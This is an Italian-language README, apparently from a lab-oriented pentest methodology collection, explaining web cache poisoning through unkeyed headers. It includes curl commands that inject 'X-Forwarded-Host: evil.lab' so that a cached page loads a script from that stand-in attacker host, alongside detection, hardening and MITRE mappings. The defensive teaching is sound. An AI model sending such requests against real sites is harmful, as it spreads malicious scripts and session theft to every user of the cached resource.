> [English](README.en.md) | **Italiano**

# Web cache poisoning

> - **Fase:** Web exploitation - OWASP A05:2021 Security Misconfiguration
> - **Visibilita:** Media - richieste con header anomali; una volta avvelenata la cache, l'effetto colpisce molti utenti
> - **Prerequisiti:** una cache condivisa (CDN, reverse proxy) davanti a un'app che riflette nella risposta un input **non incluso nella chiave di cache** (unkeyed)
> - **Natura del documento:** metodologia + payload pratici per ambiente di laboratorio. Nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: far memorizzare alla cache condivisa una risposta manipolata, in modo che venga servita a tutti gli utenti successivi (XSS di massa, redirect, defacement, denial of service).

---

## Executive summary

Il web cache poisoning sfrutta la differenza tra cio che la cache usa come **chiave** (di solito metodo + URL) e
cio che l'app usa per **generare** la risposta. Se l'app riflette un input "unkeyed" (un header come
`X-Forwarded-Host`, `X-Forwarded-Scheme`, o un parametro ignorato dalla chiave), l'attaccante invia una
richiesta che avvelena la voce di cache: da quel momento la risposta malevola viene servita a chiunque richieda
quella URL. L'impatto e collettivo (tutti gli utenti della risorsa cacheata): severity tipica `Alto`.

## Esecuzione / comandi

### Fase 1 - trovare un input unkeyed riflesso

```bash
# Si invia un header candidato con un marcatore e si usa un cache-buster per non sporcare la cache reale
curl -s https://target.lab/?cb=1 -H "X-Forwarded-Host: canary.evil.lab" | grep -i "canary.evil.lab"
# se il marcatore compare nella risposta -> l'header e riflesso ed e candidato unkeyed
```

### Fase 2 - avvelenamento della cache

```bash
# Richiesta che inietta un host malevolo riflesso (es. in un tag <script src> o in un redirect);
# senza cache-buster, la risposta avvelenata viene memorizzata per la URL condivisa
curl -s https://target.lab/ -H "X-Forwarded-Host: evil.lab"
# le vittime successive ricevono la risposta che carica risorse da evil.lab -> XSS/redirect di massa
```

Output illustrativo (nella risposta cacheata servita agli altri utenti):

```
<script src="https://evil.lab/x.js"></script>   <-- host iniettato via header unkeyed, ora in cache
X-Cache: HIT                                     <-- la risposta avvelenata arriva dalla cache
```

Vettori comuni: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, parametri ignorati dalla chiave, header
duplicati; combinabile con la CRLF/response splitting.

## Analisi dei risultati

Un `X-Cache: HIT` con il contenuto iniettato conferma l'avvelenamento: l'impatto e su tutti gli utenti della
risorsa (severity `Alto`, piu alto se l'iniezione e una XSS che ruba sessioni). Se la cache include nella chiave
tutti gli input che influenzano la risposta (o l'app non riflette header non fidati), il vettore e chiuso.

### Analisi teorica

La radice e un **disallineamento** tra il modello della cache (chiave) e quello dell'app (generazione): la cache
assume che a stessa chiave corrisponda stessa risposta, ma l'app la fa variare su input non in chiave. La
contromisura e allineare i due modelli: non riflettere input non fidati, oppure includere nella chiave ogni
input che influenza la risposta (o marcare `Cache-Control: no-store` dove serve).

## Remediation (blue team)

**Rilevamento.** Header `X-Forwarded-*` anomali nelle richieste; risposte cacheate che contengono host/URL
inattesi; picchi di `X-Cache: HIT` su contenuti sospetti.

**Hardening.** Non riflettere header non fidati (`X-Forwarded-Host` ecc.); includere nella cache key tutti gli
input rilevanti; normalizzare/limitare gli header accettati al bordo; `Cache-Control` corretto per contenuti
personalizzati.

---

## Scenario reale: proiezione post-exploitation

> Vale per l'esito "cache avvelenata con XSS/redirect" (severity Alto).

**Red team:** avvelena la home/una risorsa comune con un `<script>` da `evil.lab`; tutti gli utenti successivi
eseguono lo script, con furto di sessioni di massa o redirect. **Blue team:** rilevare header unkeyed riflessi e
HIT su contenuti anomali; invalidare la cache; correggere la cache key. Lezione: la cache amplifica un difetto
singolo in un impatto collettivo.

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` (param miner) | proxy/scanner | web - attivo | scoperta automatica di header/parametri unkeyed riflessi |
| `curl` | client http | cli - attivo | test manuale con header candidati e cache-buster |

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | sfruttamento della riflessione di input unkeyed su un'app dietro cache condivisa. |
| impact | data manipulation: stored data manipulation | `T1565.001` | memorizzazione in cache di una risposta manipolata servita a tutti gli utenti. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [crlf injection](<../crlf-injection (CRLF Injection)/README.md>) | web cache poisoning | la response splitting puo generare la risposta malevola poi cacheata |
| web cache poisoning | [xss](<../xss (Cross-Site Scripting)/README.md>) | l'iniezione cacheata e spesso una xss servita a tutti |

---

> **Nota:** Contenuto didattico. I test vanno eseguiti solo su applicazioni di proprieta o con autorizzazione esplicita, in laboratorio, usando cache-buster per non impattare utenti reali. Output illustrativi.
